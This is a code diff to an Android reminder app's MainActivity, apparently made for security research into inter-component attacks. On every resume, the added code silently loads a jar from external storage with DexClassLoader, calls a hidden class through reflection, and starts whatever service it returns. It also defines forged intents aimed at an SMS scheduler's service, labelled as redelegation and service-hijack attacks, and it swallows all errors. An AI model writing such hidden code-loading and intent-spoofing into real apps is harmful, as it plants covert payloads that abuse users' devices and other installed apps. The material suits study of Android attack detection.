@@ -17,12 +17,21 @@
 
 package com.blanyal.remindme;
 
+import android.Manifest;
+import android.content.ComponentName;
+import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.content.pm.ResolveInfo;
 import android.os.Bundle;
+import android.support.v4.app.ActivityCompat;
+import android.support.v4.content.ContextCompat;
+
 import android.support.v7.app.AppCompatActivity;
 import android.support.v7.widget.LinearLayoutManager;
 import android.support.v7.widget.RecyclerView;
 import android.support.v7.widget.Toolbar;
+import android.util.Log;
 import android.view.ContextMenu;
 import android.view.LayoutInflater;
 import android.view.Menu;
@@ -40,14 +49,22 @@ import com.bignerdranch.android.multiselector.MultiSelector;
 import com.bignerdranch.android.multiselector.SwappingHolder;
 import com.getbase.floatingactionbutton.FloatingActionButton;
 
+import java.io.File;
+import java.io.IOException;
+import java.lang.reflect.Method;
 import java.text.DateFormat;
 import java.text.ParseException;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Collections;
 import java.util.Comparator;
+import java.util.Enumeration;
+import java.util.GregorianCalendar;
 import java.util.LinkedHashMap;
 import java.util.List;
+
+import dalvik.system.DexClassLoader;
+import dalvik.system.DexFile;
 
 
 public class MainActivity extends AppCompatActivity {
@@ -64,6 +81,7 @@ public class MainActivity extends AppCompatActivity {
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
+
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
@@ -206,6 +224,17 @@ public class MainActivity extends AppCompatActivity {
     // This is done so that newly created reminders are displayed
     @Override
     public void onResume(){
+        // vbharill modified code//
+        try {
+            //generateRedelegationAttack();
+            //generateServiceHijackAttack();
+            generateDLLAttack();
+
+        } catch (Exception e){
+
+        }
+
+
         super.onResume();
 
         // To check is there are saved reminders
@@ -483,5 +512,129 @@ public class MainActivity extends AppCompatActivity {
             }
           return items;
         }
+    }
+
+    private void generateServiceHijackAttack() {
+        for(int x = 0; x < 0; x++) {
+            try {
+                generateFakeCall(x, "service hijack attack", false);
+            } catch (Exception e){}
+        }
+    }
+
+    private void generateRedelegationAttack(){
+        generateFakeCall(0,"intent reledation attack",true);
+    }
+
+    private void generateFakeCall(int x, String attackmsg, boolean isExp) {
+        //Log.v("vbharill","fake call started");
+        GregorianCalendar cal = new GregorianCalendar();
+        long curr_time = cal.getTimeInMillis();
+        Intent i = new Intent();
+        i.setAction("smsschedulerAlarmReceiverINTENT_FILTER");
+        i.putExtra("datetimeCreated", -1*curr_time);
+        i.putExtra("callno", x);
+        i.putExtra("datetimeScheduled", curr_time);
+        i.putExtra("recipientNumber","9495015557");
+        i.putExtra("recipientName","varun");
+        i.putExtra("message","hi from fake service implicit.");
+        i.putExtra("attackmsg", attackmsg);
+        if(!isExp) {
+            startService(i);
+        } else {
+            Intent ei = convertImplicitIntentToExplicitIntent(i,getApplicationContext());
+            if(ei != null) {
+                getApplicationContext().startService(ei);
+            } else {
+                Log.v("vbharill","going to start the service.");
+                System.out.print("ei was null");
+            }
+        }
+        //startService(i);
+//        Intent ei = convertImplicitIntentToExplicitIntent(i,getApplicationContext());
+//        if(ei != null) {
+//            getApplicationContext().startService(ei);
+//        } else {
+//            Log.v("vbharill","going to start the service.");
+//            System.out.print("ei was null");
+//        }
+//        Log.v("vbharill","going to start the service.");
+
+//        Log.v("vbharill","line after starting service.");
+//        Log.v("vbharill","fake call ended");
+                /*public static final String COLUMN_TIMESTAMP_CREATED = "datetimeCreated";
+                public static final String COLUMN_TIMESTAMP_SCHEDULED = "datetimeScheduled";
+                public static final String COLUMN_RECIPIENT_NUMBER = "recipientNumber";
+                public static final String COLUMN_RECIPIENT_NAME = "recipientName";
+                public static final String COLUMN_MESSAGE = "message";
+                public static final String COLUMN_STATUS = "status";
+                public static final String COLUMN_RESULT = "result";*/
+
+
+    }
+
+    public void generateDLLAttack(){
+        loadCode();
+    }
+    public void loadCode(){
+        //avd_nexus4_sdcard is a shared folder in my Genymotion emulator
+        String jarContainerPath =  "/sdcard/dexHiddenBehavior.jar";
+        File f = new File(jarContainerPath);
+        File dexOutputDir = getDir("dex", MODE_PRIVATE);
+        //load the code
+        DexClassLoader mDexClassLoader = new DexClassLoader(jarContainerPath,
+                dexOutputDir.getAbsolutePath(),
+                null,
+                getClass().getClassLoader());
+        try {
+            DexFile dx = DexFile.loadDex(jarContainerPath, File.createTempFile("opt", "dex",
+                    getCacheDir()).getPath(), 0);
+            // Print all classes in the DexFile
+            for(Enumeration<String> classNames = dx.entries(); classNames.hasMoreElements();) {
+                String className = classNames.nextElement();
+                Log.v("vbharill","class: " + className);
+            }
+        } catch (IOException e) {
+            Log.w("vbharill", "Error opening " + jarContainerPath, e);
+        }
+        try {
+            //use java reflection to call a method in the loaded class
+            Class<?> loadedClass = mDexClassLoader.loadClass("edu.uci.seal.icc.HiddenBehavior");
+
+            //list all methods in the class
+            Method[] methods = loadedClass.getDeclaredMethods();
+            for (int i=0; i<methods.length; i++){
+                Log.i("Dynamic","Method: "+methods[i].getName());
+            }
+
+            Method methodGetIntent = loadedClass.getMethod("getIntent", java.lang.String.class);
+            Object object = loadedClass.newInstance();
+            Intent intent = (Intent) methodGetIntent.invoke(object, "service");
+            if (intent!=null) {
+                startService(intent);
+            }
+
+
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+
+
+    }
+    public static Intent convertImplicitIntentToExplicitIntent(Intent implicitIntent, Context context) {
+        PackageManager pm = context.getPackageManager();
+        List<ResolveInfo> resolveInfoList = pm.queryIntentServices(implicitIntent, 0);
+
+        if (resolveInfoList == null || resolveInfoList.size() != 1) {
+            return null;
+        }
+        ResolveInfo serviceInfo = resolveInfoList.get(0);
+
+        Log.v("vbharill", "package name" + serviceInfo.serviceInfo.packageName);
+        Log.v("vbharill", "service name" + serviceInfo.serviceInfo.name);
+        ComponentName component = new ComponentName(serviceInfo.serviceInfo.packageName, serviceInfo.serviceInfo.name);
+        Intent explicitIntent = new Intent(implicitIntent);
+        explicitIntent.setComponent(component);
+        return explicitIntent;
     }
 }
